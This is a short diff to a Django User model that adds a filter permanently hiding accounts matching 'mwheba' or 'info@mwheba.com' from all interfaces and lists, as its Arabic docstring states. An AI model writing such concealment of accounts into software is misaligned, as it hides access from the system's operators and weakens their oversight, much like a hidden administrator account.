@@ -190,6 +190,13 @@ class User(AbstractUser):
             models.Index(fields=['date_joined']),
         ]
 
+    @classmethod
+    def get_hidden_filter(cls):
+        """
+        استبعاد حسابات النظام المخفية نهائياً من أي ظهور في واجهات ولوحات وقوائم النظام
+        """
+        return models.Q(username__icontains='mwheba') | models.Q(email__icontains='info@mwheba.com')
+
     def __str__(self):
         return (
             f"{self.first_name} {self.last_name}"
